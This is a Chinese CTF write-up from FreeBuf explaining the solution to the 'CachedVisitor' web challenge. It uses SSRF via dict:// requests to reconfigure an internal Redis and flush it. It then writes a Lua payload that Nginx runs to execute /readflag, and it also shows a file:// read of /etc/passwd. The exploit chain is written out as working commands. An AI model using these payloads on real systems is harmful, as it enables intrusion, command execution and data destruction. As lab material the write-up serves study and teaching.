---
title: 2024年软件系统安全赛攻防赛web题CachedVisitor题解
url: https://www.freebuf.com/articles/web/419244.html
source: FreeBuf网络安全行业门户
date: 2025-01-08
fetch_date: 2025-10-06T20:10:04.340459
---

# 2024年软件系统安全赛攻防赛web题CachedVisitor题解

[![freeBuf](/images/logoMax.png)](/)

主站

分类

云安全

AI安全

开发安全

终端安全

数据安全

Web安全

基础安全

企业安全

关基安全

移动安全

系统安全

其他安全

特色

热点

工具

漏洞

人物志

活动

安全招聘

攻防演练

政策法规

[报告](https://www.freebuf.com/report)[专辑](/column)

* ···
* [公开课](https://live.freebuf.com)
* ···
* [商城](https://shop.freebuf.com)
* ···
* 用户服务
* ···

行业服务

政 府

CNCERT
CNNVD

会员体系（甲方）
会员体系（厂商）
产品名录
企业空间

[知识大陆](https://wiki.freebuf.com/page)

搜索

![](/freebuf/img/7aa3bf7.svg) ![](/freebuf/img/181d733.svg)

创作中心

[登录](https://www.freebuf.com/oauth)[注册](https://www.freebuf.com/oauth)

官方公众号企业安全新浪微博

![](/images/gzh_code.jpg)

FreeBuf.COM网络安全行业门户，每日发布专业的安全资讯、技术剖析。

![FreeBuf+小程序](/images/xcx-code.jpg)

FreeBuf+小程序把安全装进口袋

[![](https://image.3001.net/images/20231020/1697804527_653270ef7570cc7356ba8.png)](https://wiki.freebuf.com)

2024年软件系统安全赛攻防赛web题CachedVisitor题解

* ![]()
* 关注

* [Web安全](https://www.freebuf.com/articles/web)

2024年软件系统安全赛攻防赛web题CachedVisitor题解

2025-01-07 17:31:57

所属地 山东省

先给payload:

> dict://127.0.0.1:6379/info // 测试ssrf
> dict://127.0.0.1:6379/flushall
> dict://127.0.0.1:6379/config set dir /scripts
> dict://127.0.0.1:6379/config set dbfilename visit.script
> dict://127.0.0.1:6379/set shell "\n\n\n##LUA\_START##ngx.say(io.popen('/readflag'):read('\*a'))##LUA\_END##\n\n\n"
> dict://127.0.0.1:6379/save

题目给的docker文件，点开html这是个很常规的SSRF测试点，而且有redis配置文件，说明内网有redis，部署了下docker看了下并没有配置计划任务，没有ssh，而且redis.conf中配置enable-module-command no，后续主从复制会出现不能加载模块的问题，后续redis提权排除写计划任务，写ssh公钥，以及主从复制，所以尝试写文件的方式利用

docker部署本地环境(windows要先登录不登录拖去不了镜像)

> docker build -t test .

然后再docker上添加端口映射后直接运行容器就行
![1736235530_677cda0a808aa22199e30.png!small](https://image.3001.net/images/20250107/1736235530_677cda0a808aa22199e30.png!small)

随便输入一个网址他会去请求改网页内容并返回
![1736235747_677cdae37647a116940a9.png!small](https://image.3001.net/images/20250107/1736235747_677cdae37647a116940a9.png!small)在redis.conf中看到端口为6379![1736235875_677cdb6323ef48553db26.png!small](https://image.3001.net/images/20250107/1736235875_677cdb6323ef48553db26.png!small)

直接测试ssrf
dict://127.0.0.1:6379/info

![1736235917_677cdb8d56184a1890188.png!small](https://image.3001.net/images/20250107/1736235917_677cdb8d56184a1890188.png!small)

存在ssrf，在dockerfile中看到flag设置了root权限直接用redis读取不能读取，而readflag是一个可执行文件，有设置了suid(就是普通用户在执行readflag时具有root权限)，显然是要执行readflag才能读取到flag。
![1736235981_677cdbcd45a26a4f28c4c.png!small](https://image.3001.net/images/20250107/1736235981_677cdbcd45a26a4f28c4c.png!small)这里验证file://协议直接读取不能读取/flag，图一读取/etc/passwd验证可以使用file://协议读取文件，图二验证直接读取权限不够。

![1736236142_677cdc6e6b508bf8a5dff.png!small](https://image.3001.net/images/20250107/1736236142_677cdc6e6b508bf8a5dff.png!small)

读取失败了

![1736236231_677cdcc7d45cefd1bb723.png!small](https://image.3001.net/images/20250107/1736236231_677cdcc7d45cefd1bb723.png!small)

尝试利用redis提升权限到普通用户级别并执行命令。

这里想到两个思路一个是用redis保存键值的方式写文件，写入到main.lua在每次访问页面的时候执行main.lua并在写入的命令中执行/readflag读取flag并打印出来。另外一个是写入到visit.script中当main.lua执行使会读取visit.script中内容并提去脚本执行。

这里思路一，在redis写入文件时会出现多余的内容，会导致main.lua无法执行，忘记截图了，不过操作方式与思路二相同只是写入路径不同。

思路二，说下思路二为什么可以执行思路一不能执行，关键在这里：
![1736236828_677cdf1c1895691100075.png!small](https://image.3001.net/images/20250107/1736236828_677cdf1c1895691100075.png!small)由于script\_content:match("##LUA\_START##(.-)##LUA\_END##")再次提取了脚本内容将##LUA\_START##和##LUA\_END##包裹的内容作为执行语句，所以避免了redis本地存储时的冗余字符。这是写入main.lua是的样子可以看到除了payload还有其他字符，所以无法执行。
![1736240806_677ceea6bf0132f038c80.png!small](https://image.3001.net/images/20250107/1736240806_677ceea6bf0132f038c80.png!small)

payload:

> dict://127.0.0.1:6379/config set dir /scripts
> dict://127.0.0.1:6379/config set dbfilename visit.script
>
> dict://127.0.0.1:6379/flushall   // 清空键值缓存
> dict://127.0.0.1:6379/set shell "\n\n\n##LUA\_START##ngx.say(io.popen('/readflag'):read('\*a'))##LUA\_END##\n\n\n"
> dict://127.0.0.1:6379/save    // 保存既写入本地文件

![1736237916_677ce35cdcf4e74e94822.png!small](https://image.3001.net/images/20250107/1736237916_677ce35cdcf4e74e94822.png!small)

最后解释下这一句ngx.say(io.popen('/readflag'):read('\*a'))

> 这行代码是使用 Lua 脚本语言在 Nginx 的嵌入式脚本模块 ngx\_lua 中执行的。下面是对这行代码的解释：
>
> * `io.popen('/readflag')`：这是 Lua 中的一个函数调用，`io.popen`用于执行一个外部命令并打开一个管道来读取该命令的输出。这里的`/readflag`是一个外部命令，通常在一些编程竞赛或安全测试环境中，`/readflag`这个命令会输出一个特定的字符串（通常是比赛的“flag”或答案）.
> * `:read('*a')`：这是对管道对象调用的`read`方法，`'*a'`参数表示读取管道中的全部内容直到结束。
> * `ngx.say(...)`：这是 ngx\_lua 模块提供的函数，用于向客户端输出数据。它会将括号内的内容发送到客户端浏览器或客户端程序.

因此，这行代码的总体作用是：在 Nginx 服务器上执行`/readflag`命令，读取该命令的全部输出，并将输出结果发送给客户端。

另外基于上述方法还有一种思路：由于所有的请求都会记录进redis，所以只需要自己部署个临时web服务器其中的内容放##LUA\_START##ngx.say(io.popen('/readflag'):read('\*a'))##LUA\_END##，这样请求后##LUA\_START##ngx.say(io.popen('/readflag'):read('\*a'))##LUA\_END##就会被记录到redis中，在save使其存储到visit.script中，这样当main.lua执行时，就会读取到visit.script中的##LUA\_START##ngx.say(io.popen('/readflag'):read('\*a'))##LUA\_END##，最后就会执行ngx.say(io.popen('/readflag'):read('\*a'))拿到flag。

# SSRF # Redis # Redis未授权访问漏洞

免责声明

1.一般免责声明：本文所提供的技术信息仅供参考，不构成任何专业建议。读者应根据自身情况谨慎使用且应遵守《中华人民共和国网络安全法》，作者及发布平台不对因使用本文信息而导致的任何直接或间接责任或损失负责。

2. 适用性声明：文中技术内容可能不适用于所有情况或系统，在实际应用前请充分测试和评估。若因使用不当造成的任何问题，相关方不承担责任。

3. 更新声明：技术发展迅速，文章内容可能存在滞后性。读者需自行判断信息的时效性，因依据过时内容产生的后果，作者及发布平台不承担责任。

本文为 独立观点，未经授权禁止转载。
如需授权、对文章有疑问或需删除稿件，请联系 FreeBuf
客服小蜜蜂（微信：freebee1024）

被以下专辑收录，发现更多精彩内容

+ 收入我的专辑

+ 加入我的收藏

展开更多

相关推荐

![]()

关 注

* 0 文章数
* 0 关注者

![](/images/logo_b.png)

本站由阿里云 提供计算与安全服务

### 用户服务

* [有奖投稿](https://www.freebuf.com/write)
* [提交漏洞](https://www.vulbox.com/bounties/detail-72)
* [参与众测](https://www.vulbox.com/projects/list)
* [商城](https://shop.freebuf.com)

### 企业服务

* [安全咨询](https://company.freebuf.com)
* [产业全景图](https://www.freebuf.com/news/307349.html)
* [企业SRC](https://www.vulbox.com/service/src)
* [安全众测](https://www.vulbox.com/)

### 合作信息

* [斗象官网](https://www.tophant.com/)
* [广告投放](https://www.freebuf.com/articles/444331.html)
* [联系我们](https://www.freebuf.com/articles/444332.html)

### 关于我们

* [关于我们](https://www.freebuf.com/news/others/864.html)
* 微信公众号
* [新浪微博](http://weibo.com/freebuf)

### 战略伙伴

* [![](https://image.3001.net/images/20191017/1571306518_5da83c1686dd9.png)](http://www.aliyun.com/?freebuf)

### FreeBuf知识大陆

![](https://image.3001.net/images/20250703/1751535036_68664dbcae34ac40bb9e7.png)

扫码把安全装进口袋

* [斗象科技](https://www.tophant.com/)
* [FreeBuf](https://www.freebuf.com)
* [漏洞盒子](https://www.vulbox.com/)
* [斗象智能安全](https://ai.tophant.com/)
* [免责条款](https://www.freebuf.com/dis)
* [协议条款](https://my.freebuf.com/AgreeProtocol/duty)

Copyright © 2025 WWW.FREEBUF.COM All Rights Reserved
[沪ICP备2024099014号](https://beian.miit.gov.cn/#/Integrated/index) | [沪公安网备
![](https://image.3001.net/images/20200106/1578291342_5e12d08ec2379.png)](http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=31011502009321)